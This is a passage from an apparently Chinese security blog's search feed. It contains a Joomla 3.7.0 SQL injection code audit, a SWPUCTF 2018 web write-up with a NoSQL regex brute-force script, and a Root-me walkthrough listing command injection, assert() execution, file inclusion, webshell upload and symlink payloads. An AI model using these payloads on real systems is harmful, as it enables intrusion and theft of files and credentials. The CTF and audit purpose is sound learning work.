<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>代码审计-Joomla3.7.0_Com_field_组件注入漏洞</title>
      <link href="/2019/02/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Joomla3-7-0-Com-field-%E7%BB%84%E4%BB%B6%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/02/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Joomla3-7-0-Com-field-%E7%BB%84%E4%BB%B6%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>Joomla!是一套全球知名的内容管理系统。Joomla!是使用PHP语言加上MySQL数据库所开发的软件系统，可以在Linux、 Windows、MacOSX等各种不同的平台上执行。目前是由Open Source Matters（见扩展阅读）这个开放源码组织进行开发与支持，这个组织的成员来自全世界各地，小组成员约有150人，包含了开发者、设计者、系统管理者、文件撰写者，以及超过2万名的参与会员。</p><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><p>这个漏洞出现在Joomla3.7.0新增的组件com_field里，这个组件的访问没有做任何身份验证，并且在处理fullordering参数时没有合格的过滤，导致最终将用户的输入拼接在了sql查询语句的order by参数里，形成注入。</p><h2 id="源码结构"><a href="#源码结构" class="headerlink" title="源码结构"></a>源码结构</h2><p>Joomla!源码结构如下图<br><img src="/img/joomla/1.png"></p><h2 id="调用流程"><a href="#调用流程" class="headerlink" title="调用流程"></a>调用流程</h2><p>入口函数如下，前面的都是用来宏定义一些参数，最后一行execute转入site.php接着转入helper.php，通过require_once调用传入的组件参数。</p><p><img src="/img/joomla/2.png"></p><p>如下为Joomla的调用栈,可以很清晰的看到Joomla的调用路径。</p><p><img src="/img/joomla/3.png"></p><p>这个fields.php关键代码如下。分别完成了组件注册，控制器的实例生成，执行命令等功能。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JLoader::register(&#x27;FieldsHelper&#x27;, JPATH_ADMINISTRATOR . &#x27;/components/com_fields/helpers/fields.php&#x27;);</span><br><span class="line">$controller = JControllerLegacy::getInstance(&#x27;Fields&#x27;);</span><br><span class="line">$controller-&gt;execute(JFactory::getApplication()-&gt;input-&gt;get(&#x27;task&#x27;));</span><br><span class="line">$controller-&gt;redirect();</span><br></pre></td></tr></table></figure><p>首先来看看fields组件生成实例部分的代码，在它的构造函数里，注意到当我们访问这个组件时，它会把路径设置为JPATH_COMPONENT_ADMINISTRATOR,而这个宏定义默认为administrator\components\，使得后面加载model时是直接用administrator目录下的函数进行加载。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public function __construct($config = array())</span><br><span class="line">&#123;</span><br><span class="line">    $this-&gt;input = JFactory::getApplication()-&gt;input;</span><br><span class="line">    // Frontpage Editor Fields Button proxying:</span><br><span class="line">    if ($this-&gt;input-&gt;get(&#x27;view&#x27;) === &#x27;fields&#x27; &amp;&amp; $this-&gt;input-&gt;get(&#x27;layout&#x27;) === &#x27;modal&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        // Load the backend language file.</span><br><span class="line">        $lang = JFactory::getLanguage();</span><br><span class="line">        $lang-&gt;load(&#x27;com_fields&#x27;, JPATH_ADMINISTRATOR);</span><br><span class="line">        $config[&#x27;base_path&#x27;] = JPATH_COMPONENT_ADMINISTRATOR;</span><br><span class="line">    &#125;</span><br><span class="line">    parent::__construct($config);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在获取实例后就进入了$controller-&gt;execute方法，该方法首先调用如下函数，它最后返回的doTask值为display,接着调用库函数中的display函数，它又会调用组件目录下display函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public function execute($task)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;task = $task;</span><br><span class="line">        $task = strtolower($task);</span><br><span class="line">        if (isset($this-&gt;taskMap[$task]))</span><br><span class="line">        &#123;</span><br><span class="line">            $doTask = $this-&gt;taskMap[$task];</span><br><span class="line">        &#125;</span><br><span class="line">        elseif (isset($this-&gt;taskMap[&#x27;__default&#x27;]))</span><br><span class="line">        &#123;</span><br><span class="line">            $doTask = $this-&gt;taskMap[&#x27;__default&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            throw new Exception(JText::sprintf(&#x27;JLIB_APPLICATION_ERROR_TASK_NOT_FOUND&#x27;, $task), 404);</span><br><span class="line">        &#125;</span><br><span class="line">        // Record the actual task being fired</span><br><span class="line">        $this-&gt;doTask = $doTask;</span><br><span class="line">        return $this-&gt;$doTask();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p> |</p><p>display函数调用组件的model文件，接着它调用了libraries\legacy\model\list.php中的populateState方法，在处理参数fulloredering时，没有太多严格的过滤，接着就直接使用了setstate方法把用户输入保存了下来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">case &#x27;fullordering&#x27;:</span><br><span class="line">    $orderingParts = explode(&#x27; &#x27;, $value);</span><br><span class="line">    if (count($orderingParts) &gt;= 2)</span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;setState(&#x27;list.ordering&#x27;, $ordering);</span><br><span class="line">        $this-&gt;setState(&#x27;list.direction&#x27;, $direction);</span><br><span class="line">    &#125;</span><br><span class="line">    break;</span><br><span class="line">    ...</span><br><span class="line">$value = $app-&gt;getUserStateFromRequest($this-&gt;context . &#x27;.limitstart&#x27;, &#x27;limitstart&#x27;, 0, &#x27;int&#x27;);</span><br><span class="line">$limitstart = ($limit != 0 ? (floor($value / $limit) * $limit) : 0);</span><br><span class="line">$this-&gt;setState(&#x27;list.start&#x27;, $limitstart);</span><br></pre></td></tr></table></figure><p> |</p><p>保存下来的用户输入如下。</p><p><img src="/img/joomla/4.png"></p><p>整个调用栈如下</p><p><img src="/img/joomla/5.png"></p><p>其中调用getUserStateFromRequest方法处理用户的输入，接着它调用了getUserState方法进行处理，注册session,生成list.fullordering的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public function getUserState($key, $default = null)</span><br><span class="line">&#123;</span><br><span class="line">    $session = JFactory::getSession();</span><br><span class="line">    $registry = $session-&gt;get(&#x27;registry&#x27;);</span><br><span class="line">    if (!is_null($registry))</span><br><span class="line">    &#123;</span><br><span class="line">        return $registry-&gt;get($key, $default);</span><br><span class="line">    &#125;</span><br><span class="line">    return $default;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> |</p><p>接着在display函数里的$this-&gt;get(Items’)方法中，通过getstate方法将list.fullordering的值，在逃脱了escape方法过滤的情况下，拼接进了sql语句中，并在之后得到执行并回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// Add the list ordering clause</span><br><span class="line">$listOrdering = $this-&gt;getState(&#x27;list.fullordering&#x27;, &#x27;a.ordering&#x27;);</span><br><span class="line">$orderDirn    = &#x27;&#x27;;</span><br><span class="line">if (empty($listOrdering))</span><br><span class="line">&#123;</span><br><span class="line">    $listOrdering  = $this-&gt;state-&gt;get(&#x27;list.ordering&#x27;, &#x27;a.ordering&#x27;);</span><br><span class="line">    $orderDirn     = $this-&gt;state-&gt;get(&#x27;list.direction&#x27;, &#x27;DESC&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">$query-&gt;order($db-&gt;escape($listOrdering) . &#x27; &#x27; . $db-&gt;escape($orderDirn));  </span><br><span class="line">return $query;</span><br></pre></td></tr></table></figure><p>执行结果如下</p><p><img src="/img/joomla/6.png"></p><p>流程图如下</p><p><img src="/img/joomla/7.png"></p><h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>官方给出的修复如下</p><p><img src="/img/joomla/8.png"></p><p>在第三步拼接sql时，在administrator&#x2F;components&#x2F;com_fields&#x2F;models&#x2F;fields.php里不再使用用户可控的fullordering参数，而是直接拼接ordering参数，而这个参数在输入时会进行白名单检测，无法形成注入，因此可以成功防御此漏洞。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF 2018 部分Web write up</title>
      <link href="/2018/12/23/SWPUCTF-2018-%E9%83%A8%E5%88%86Web-write-up/"/>
      <url>/2018/12/23/SWPUCTF-2018-%E9%83%A8%E5%88%86Web-write-up/</url>
      
        <content type="html"><![CDATA[<h2 id="用优惠劵买个X"><a href="#用优惠劵买个X" class="headerlink" title="用优惠劵买个X?"></a>用优惠劵买个X?</h2><p>登录后给了一个优惠券，存在cookie的Auth里<br><img src="/img/swpu/1.png">  </p><p>在购买界面输入该优惠券返回说需要24位的优惠券。<br>扫描目标站点发现有<a href="http://www.zip,下载打开发现source.php/">www.zip,下载打开发现source.php</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//生成优惠码</span><br><span class="line">$_SESSION[&#x27;seed&#x27;]=rand(0,999999999);</span><br><span class="line">function youhuima()&#123;</span><br><span class="line">    mt_srand($_SESSION[&#x27;seed&#x27;]);</span><br><span class="line">    $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">    $auth=&#x27;&#x27;;</span><br><span class="line">    $len=15;</span><br><span class="line">    for ( $i = 0; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        if($i&lt;=($len/2))</span><br><span class="line">              $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);</span><br><span class="line">        else</span><br><span class="line">              $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);</span><br><span class="line">    &#125;</span><br><span class="line">    setcookie(&#x27;Auth&#x27;, $auth);</span><br><span class="line">&#125;</span><br><span class="line">//support</span><br><span class="line">    if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip))&#123;</span><br><span class="line">        if (!preg_match(&quot;/\?|flag|&#125;|cat|echo|\*/i&quot;,$ip))&#123;</span><br><span class="line">               //执行命令</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">              //flag字段和某些字符被过滤!</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">             // 你的输入不正确!</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>判断需要利用PHP伪随机预测出24位的优惠码，利用了wonderkun的博客里介绍的方法和脚本。<br>首先根据源码构造脚本如下，计算出每次的mt_rand()的值，并且按照工具php_mt_seed的参数要求打印。这里要注意的是，不同版本的PHP在执行mt_rand()会有不同，而根据网页的响应头得知服务器版本为7.2.9，因此在执行下面的脚本时也需要使用7.2版本的PHP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str=&quot;HNzlZc7wgMWEfWN&quot;;</span><br><span class="line">$str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">for($i=0;$i&lt;15;$i++)&#123;</span><br><span class="line">  if($i&lt;=(15/2))&#123;</span><br><span class="line">    $pos=strpos($str_rand,$str[$i]);  </span><br><span class="line">    echo $pos.&quot; &quot;.$pos.&quot; 0 &quot;.(strlen($str_rand)-1).&quot; &quot;;</span><br><span class="line">  &#125;               </span><br><span class="line">  else&#123;</span><br><span class="line">    $pos = strlen($str_rand)-strpos($randstr,$str[$i]);</span><br><span class="line">    echo $pos.&quot; &quot;.$pos.&quot; 0 &quot;.(strlen($str_rand)-1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>接着使用php_mt_seed爆破出结果<br><img src="/img/swpu/2.png">  </p><p>放入原脚本中，并且加入代码mt_srand(506450967),并把优惠券长度改为24位，即可得到24位的优惠券。</p><p><img src="/img/swpu/3.png">  </p><p>输入会显示购买成功，然后就来到第二个页面，要求输入ip。观察源码，需要绕过两个正则，第一个正则有&#x2F;m参数，即在每个换行符前后进行句首(^)句尾($)匹配，匹配成功一次即可返回正确，利用%0a可以绕过。第二个正则可以利用base64编码绕过。让服务器执行cat &#x2F;flag即可<br><img src="/img/swpu/44.png"></p><h2 id="injection"><a href="#injection" class="headerlink" title="injection ???"></a>injection ???</h2><p>测试sql注入不成功，在F12里看到有info.php，打开后是phpinfo，在里面看到开启了mongodb,猜测为NoSQL注入，测试?username[$ne]&#x3D;123&amp;password[$ne]&#x3D;123发现成功注入，但是回显不是正确的密码，猜测需要注入得到正确的密码。利用[$regex]配合^可以一位一位的得到正确的密码。该页面登录需要验证码，使用pytesseract库进行破解。构造脚本如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import pytesseract</span><br><span class="line">import requests,string</span><br><span class="line">from PIL import Image</span><br><span class="line">import time </span><br><span class="line">s=requests.session()</span><br><span class="line">passwd=&#x27;&#x27;</span><br><span class="line">for  j  in range(30):</span><br><span class="line">    for i in string.printable:</span><br><span class="line">        while True:</span><br><span class="line">            time.sleep(1)</span><br><span class="line">            r=s.get(&#x27;http://123.206.213.66:45678/vertify.php&#x27;)</span><br><span class="line">            with open(&#x27;yzm.jpg&#x27;,&#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(r.content)</span><br><span class="line">            cap=pytesseract.image_to_string(Image.open(&#x27;yzm.jpg&#x27;))</span><br><span class="line">            url=&#x27;http://123.206.213.66:45678/check.php?username[$ne]=123&amp;password[$regex]=^&#123;&#125;&amp;vertify=&#123;&#125;&#x27;</span><br><span class="line">            print(url.format(passwd+i,cap))</span><br><span class="line">            r=s.get(url.format(passwd+i,cap))</span><br><span class="line">            print(r.text)</span><br><span class="line">            if not &#x27;wrong&#x27; in r.text:</span><br><span class="line">                break</span><br><span class="line">        if &#x27;Nice&#x27;  in r.text:</span><br><span class="line">            passwd+=i</span><br><span class="line">            print(passwd)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p>即可得到正确的密码，登录即可getflag。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Root-me Web-server write up</title>
      <link href="/2018/11/22/Root-me-Web-server-write-up/"/>
      <url>/2018/11/22/Root-me-Web-server-write-up/</url>
      
        <content type="html"><![CDATA[<p>root-me是一个在线的ctf题库(需翻墙)，包含了各个维度的题型，题不算难，但是比较全面。做了一下web-server的题，并做了记录。</p><h2 id="1-HTML"><a href="#1-HTML" class="headerlink" title="1.HTML"></a>1.HTML</h2><p>[+]URL: <a href="http://challenge01.root-me.org/web-serveur/ch1/" title="http://challenge01.root-me.org/web-serveur/ch1/">http://challenge01.root-me.org/web-serveur/ch1/</a><br>[+]Statement:找到flag<br>[+]Solution:flag在源码里,F12即可</p><h2 id="2-HTTP-Open-redirect"><a href="#2-HTTP-Open-redirect" class="headerlink" title="2.HTTP - Open redirect"></a>2.HTTP - Open redirect</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch52/" title="http://challenge01.root-me.org/web-serveur/ch52/">http://challenge01.root-me.org/web-serveur/ch52/</a><br>[+]Statement:找到一种方法把网页定向到其他网站<br>[+]Solution:修改url里get的网站名，并计算其md5值<br>[+]Payload:&#x2F;web-serveur&#x2F;ch52&#x2F;?url&#x3D;<a href="https://www.baidu.com&h=f9751de431104b125f48dd79cc55822a/" title="https://www.baidu.com&amp;h=f9751de431104b125f48dd79cc55822a">https://www.baidu.com&amp;h&#x3D;f9751de431104b125f48dd79cc55822a</a></p><h2 id="3-Command-injection"><a href="#3-Command-injection" class="headerlink" title="3.Command injection"></a>3.Command injection</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch54/" title="http://challenge01.root-me.org/web-serveur/ch54/">http://challenge01.root-me.org/web-serveur/ch54/</a><br>[+]Statement:找到漏洞并利用，flag在index.php里<br>[+]Solution:典型的命令注入漏洞，利用;分割命令，使用cat打印源码，再用F12查看<br>[+]Payload:127.0.0.1;cat index.php</p><h2 id="4-Weak-password"><a href="#4-Weak-password" class="headerlink" title="4.Weak password"></a>4.Weak password</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch3/" title="http://challenge01.root-me.org/web-serveur/ch3/">http://challenge01.root-me.org/web-serveur/ch3/</a><br>[+]Solution:标题提示弱密码，账户admin，密码admin，登录成功</p><h2 id="5-User-agent"><a href="#5-User-agent" class="headerlink" title="5.User-agent"></a>5.User-agent</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch2/" title="http://challenge01.root-me.org/web-serveur/ch2/">http://challenge01.root-me.org/web-serveur/ch2/</a><br>[+]Solution:修改User-agent为admin</p><h2 id="6-Backup-file"><a href="#6-Backup-file" class="headerlink" title="6.Backup file"></a>6.Backup file</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch11/" title="http://challenge01.root-me.org/web-serveur/ch11/">http://challenge01.root-me.org/web-serveur/ch11/</a><br>[+]Solution:输入index.php~即可下载源码</p><h2 id="7-HTTP-POST"><a href="#7-HTTP-POST" class="headerlink" title="7.HTTP - POST"></a>7.HTTP - POST</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch56/" title="http://challenge01.root-me.org/web-serveur/ch56/">http://challenge01.root-me.org/web-serveur/ch56/</a><br>[+]Statement:想办法打败最高分<br>[+]Solution:用bp修改数据包，把score参数的值修改到大于999999即可</p><h2 id="8-HTTP-directory-indexing"><a href="#8-HTTP-directory-indexing" class="headerlink" title="8.HTTP directory indexing"></a>8.HTTP directory indexing</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch4/" title="http://challenge01.root-me.org/web-serveur/ch4/">http://challenge01.root-me.org/web-serveur/ch4/</a><br>[+]Solution:在源码里发现存在文件admin&#x2F;pass.html,输入payload：admin可以列出目录，在backup的admin.txt到到flag</p><h2 id="9-HTTP-Headers"><a href="#9-HTTP-Headers" class="headerlink" title="9.HTTP Headers"></a>9.HTTP Headers</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch5/" title="http://challenge01.root-me.org/web-serveur/ch5/">http://challenge01.root-me.org/web-serveur/ch5/</a><br>[+]Statement:获得 administrator用户权限<br>[+]Solution:在服务器的返回头里发现Header-RootMe-Admin: none，于是在请求里加上Header-RootMe-Admin:administrator,得到flag</p><h2 id="10-HTTP-verb-tampering"><a href="#10-HTTP-verb-tampering" class="headerlink" title="10.HTTP verb tampering"></a>10.HTTP verb tampering</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch8/" title="http://challenge01.root-me.org/web-serveur/ch8/">http://challenge01.root-me.org/web-serveur/ch8/</a><br>[+]Solution:篡改HTTP请求，换成OPTIONS即可绕过</p><h2 id="11-Install-files"><a href="#11-Install-files" class="headerlink" title="11.Install files"></a>11.Install files</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch6/" title="http://challenge01.root-me.org/web-serveur/ch6/">http://challenge01.root-me.org/web-serveur/ch6/</a><br>[+]Solution:题目提示PHPBB和installfiles，查看PHPBB源码得知PHPBB的安装路径为&#x2F;install&#x2F;install.php。输入此路径得到flag。此漏洞提示我们安装完CMS后记得删除安装文件</p><h2 id="12-Improper-redirect"><a href="#12-Improper-redirect" class="headerlink" title="12.Improper redirect"></a>12.Improper redirect</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch32/" title="http://challenge01.root-me.org/web-serveur/ch32/">http://challenge01.root-me.org/web-serveur/ch32/</a><br>[+]Solution:使用BP抓包可以看到get上面的URL时返回的数据包里有flag。此漏洞提醒在使用PHP里的header(‘Location:…’)函数后需要使用exit()，不然php会继续执行后面的代码，可能会造成信息泄漏</p><h2 id="13-CRLF"><a href="#13-CRLF" class="headerlink" title="13.CRLF"></a>13.CRLF</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch14/" title="http://challenge01.root-me.org/web-serveur/ch14/">http://challenge01.root-me.org/web-serveur/ch14/</a><br>[+]Statement:注入错误的数据到日志中<br>[+]Solution:页面显示的日志中存在认证失败和认证成功两种信息。通过使用CRLF注入，在username参数的位置注入一个%0d%0a，伪造出一个认证成功的信息<br>[+]Payload:username&#x3D;admin authenticated.%0D%0Aadmin&amp;password&#x3D;123</p><h2 id="14-File-upload-double-extensions"><a href="#14-File-upload-double-extensions" class="headerlink" title="14.File upload - double extensions"></a>14.File upload - double extensions</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch20/" title="http://challenge01.root-me.org/web-serveur/ch20/">http://challenge01.root-me.org/web-serveur/ch20/</a><br>[+]Statement:目标是上传php代码，查看应用根目录的.passwd文件<br>[+]Solution:在 &#x2F;?galerie&#x3D;upload处可以上传文件，直接上传php文件会被拦截。使用bp上传一句话木马，并把文件名改为1.php.jpg,测试发现web服务器可以解析该文件，通过执行系统命令可以看到.passwd的内容</p><h2 id="15-File-upload-MIME-type"><a href="#15-File-upload-MIME-type" class="headerlink" title="15.File upload - MIME type"></a>15.File upload - MIME type</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch21/" title="http://challenge01.root-me.org/web-serveur/ch21/">http://challenge01.root-me.org/web-serveur/ch21/</a><br>[+]Statement:同上<br>[+]Solution:同上面一样上传文件，并在BP中把数据包的MIME类型修改为image&#x2F;png,上传成功。</p><h2 id="16-HTTP-cookies"><a href="#16-HTTP-cookies" class="headerlink" title="16.HTTP cookies"></a>16.HTTP cookies</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch7/" title="http://challenge01.root-me.org/web-serveur/ch7/">http://challenge01.root-me.org/web-serveur/ch7/</a><br>[+]Solution:在网页的源码中看见了提示SetCookie(‘ch7,’visiteur’’),结合页面的提示，在请求头中加上Cookie:ch7&#x3D;admin，获得flag</p><h2 id="17-Directory-traversal"><a href="#17-Directory-traversal" class="headerlink" title="17.Directory traversal"></a>17.Directory traversal</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch15/ch15.php" title="http://challenge01.root-me.org/web-serveur/ch15/ch15.php">http://challenge01.root-me.org/web-serveur/ch15/ch15.php</a><br>[+]Solution:目录穿越漏洞，输入payload：?galerie&#x3D;&#x2F;，可列出galerie目录下的文件列表，接着输入payload：?galerie&#x3D;&#x2F;86hwnX2r&#x2F;，可以看到password.txt。访问这个文件，得到flag</p><h2 id="18-File-upload-null-byte"><a href="#18-File-upload-null-byte" class="headerlink" title="18.File upload - null byte"></a>18.File upload - null byte</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch22/" title="http://challenge01.root-me.org/web-serveur/ch22/">http://challenge01.root-me.org/web-serveur/ch22/</a><br>[+]Solution:同样是文件上传漏洞，这里是00截断,需要把filename改成1.php%00.jpg，同时需要修改MIMIE类型。</p><h2 id="19-PHP-assert"><a href="#19-PHP-assert" class="headerlink" title="19.PHP assert()"></a>19.PHP assert()</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch47/" title="http://challenge01.root-me.org/web-serveur/ch47/">http://challenge01.root-me.org/web-serveur/ch47/</a><br>[+]Statement:Find and exploit the vulnerability to read the file .passwd.<br>[+]Solution:提供错误的page参数，根据回显的assert函数的结果，可以进行拼接执行命令。<br>[+]payload:?page&#x3D;%27,%27..%27)%20&#x3D;&#x3D;&#x3D;%20false%20and%20system(%27cat%20.passwd%27)%20and%20strpos(%27</p><h2 id="20-PHP-filters"><a href="#20-PHP-filters" class="headerlink" title="20.PHP filters"></a>20.PHP filters</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch12/" title="http://challenge01.root-me.org/web-serveur/ch12/">http://challenge01.root-me.org/web-serveur/ch12/</a><br>[+]Statement:找到administrator用户的密码<br>[+]Solution：通过报错发现使用了include函数，此处有文件包含漏洞，使用file:&#x2F;&#x2F;etc&#x2F;passwd,发现不能包含远程文件。使用php协议进行本地文件包含<br>[+]Payload:</p><ul><li><a href="http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=login.php" title="http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=login.php">http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=login.php</a></li><li><a href="http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php" title="http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php">http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php</a></li></ul><h2 id="21-PHP-register-globals"><a href="#21-PHP-register-globals" class="headerlink" title="21.PHP register globals"></a>21.PHP register globals</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch17/" title="http://challenge01.root-me.org/web-serveur/ch17/">http://challenge01.root-me.org/web-serveur/ch17/</a> &amp;#x20;<br>[+]Statement:似乎开发者经常把备份文件留下… &amp;#x20;<br>[+]Solution:根据提示，下载到文件index.php.bak,分析源码。根据测试判断该服务器开启了register_globals，因此存在变量覆盖漏洞。根据源码的逻辑，有两种解题思路，一种是直接覆盖session[logged],另一种方法，覆盖password和hidden_password，接着使用这个Cookie，就可以获得flag &amp;#x20;<br>[+]Payload:</p><ul><li>_SESSION[logged]&#x3D;1</li><li>password&#x3D;1&amp;hidden_password&#x3D;1</li></ul><h2 id="22-File-upload-ZIP"><a href="#22-File-upload-ZIP" class="headerlink" title="22.File upload - ZIP"></a>22.File upload - ZIP</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch51/" title="http://challenge01.root-me.org/web-serveur/ch51/">http://challenge01.root-me.org/web-serveur/ch51/</a> &amp;#x20;<br>[+]Statement:读index.php文件1qqq &amp;#x20;<br>[+]Solution:目标是要读到index.php的内容。网站的文件上传功能只能上传.zip文件，上传完成后，服务器会解压缩，解压缩后的文件可以访问。但问题是上传的文件只有txt&#x2F;jpg可以访问。因此构造命令如下，创建一个符号链接。</p><blockquote><p>ln -s ..&#x2F;..&#x2F;..&#x2F;index.php index.txt 